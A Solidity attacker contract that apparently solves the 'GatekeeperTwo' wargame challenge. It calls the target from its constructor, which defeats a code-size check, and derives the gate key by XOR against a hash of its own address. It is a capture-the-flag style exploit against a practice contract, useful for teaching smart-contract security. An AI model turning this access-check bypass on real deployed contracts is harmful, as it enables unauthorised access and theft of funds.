// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperTwo} from "./GatekeeperTwo.sol";

contract GatekeeperTwoAttacker {
    GatekeeperTwo public immutable i_gatekeeper;

    constructor(address _gatekeeper) {
        i_gatekeeper = GatekeeperTwo(_gatekeeper);
        bytes8 key = computeKey();
        i_gatekeeper.enter(key);
    }

    function computeKey() public view returns (bytes8) {
        return bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
    }
}
